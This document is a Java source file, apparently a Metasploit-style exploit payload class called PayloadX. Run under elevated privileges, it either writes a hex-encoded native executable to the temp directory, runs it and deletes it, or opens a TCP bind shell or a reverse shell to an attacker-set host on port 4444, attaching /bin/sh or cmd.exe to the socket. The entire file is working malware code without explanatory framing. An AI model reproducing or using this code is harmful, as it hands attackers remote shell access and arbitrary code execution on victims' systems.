package msf.x;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.security.AccessController;
import java.security.PrivilegedExceptionAction;

public class PayloadX implements PrivilegedExceptionAction
{
	// This will contain a hex string of the native payload to drop and execute.
	public static String data = null;
	// If no native payload is set we get either a java bind shell or a java
	// reverse shell.
	public static String lhost = null;
	public static int lport = 4444;

	class StreamConnector extends Thread
	{
		InputStream is;
		OutputStream os;

		StreamConnector( InputStream is, OutputStream os )
		{
			this.is = is;
			this.os = os;
		}

		public void run()
		{
			BufferedReader in = null;
			BufferedWriter out = null;
			
			try
			{
				in = new BufferedReader( new InputStreamReader( is ) );
				out = new BufferedWriter( new OutputStreamWriter( os ) );
				char buffer[] = new char[8192];
				int length;
				while( ( length = in.read( buffer, 0, buffer.length ) ) > 0 )
				{
					out.write( buffer, 0, length );
					out.flush();
				}
			}
			catch( Exception e ) {}

			try
			{
				if( in != null )
					in.close();
				if( out != null )
					out.close();
			}
			catch( Exception e ) {}
		}
	}

	// http://stackoverflow.com/questions/140131/convert-a-string-representation-of-a-hex-dump-to-a-byte-array-using-java
	public static byte[] StringToBytes( String s )
	{
		byte[] data = new byte[s.length() / 2];

		for( int i = 0 ; i < s.length() ; i += 2 )
			data[i / 2] = (byte)( ( Character.digit( s.charAt( i ), 16 ) << 4 ) + Character.digit( s.charAt( i + 1 ), 16 ) );

		return data;
	}

	public Object run() throws Exception
	{
		// if the native payload data has not been set just return for now, it
		// will be set by the next time we reach here.
		if( PayloadX.data == null )
			return null;
		
		try
		{
			String os = System.getProperty( "os.name" );

			// if we have no native payload to drop and execute we default to
			// either a TCP bind or reverse shell.
			if( PayloadX.data.length() == 0 )
			{
				Socket client_socket = null;

				String shell = "/bin/sh";

				if( os.indexOf( "Windows" ) >= 0 )
					shell = "cmd.exe";

				if( PayloadX.lhost == null )
				{
					ServerSocket server_socket = new ServerSocket( PayloadX.lport );
					client_socket = server_socket.accept();
				}
				else
				{
					client_socket = new Socket( PayloadX.lhost, PayloadX.lport );
				}

				if( client_socket != null )
				{
					Process process = Runtime.getRuntime().exec( shell );

					( new StreamConnector( process.getInputStream(), client_socket.getOutputStream() ) ).start();

					( new StreamConnector( client_socket.getInputStream(), process.getOutputStream() ) ).start();
				}
			}
			else
			{
				String path = System.getProperty( "java.io.tmpdir" ) + File.separator + Math.random() + ".exe";

				Process p;
				FileOutputStream fos = new FileOutputStream( path );

				fos.write( StringToBytes( PayloadX.data ) );
				fos.close();

				if( os.indexOf( "Windows" ) < 0 )
				{
					p = Runtime.getRuntime().exec( "chmod 755 " + path );
					p.waitFor();
				}

				p = Runtime.getRuntime().exec( path );

				p.waitFor();

				new File( path ).delete();
			}
		}
		catch( Exception e ) {}
		
		return null;
	}

	public PayloadX()
	{
		try
		{
			AccessController.doPrivileged( this );
		}
		catch( Exception e ) {}
	}
}
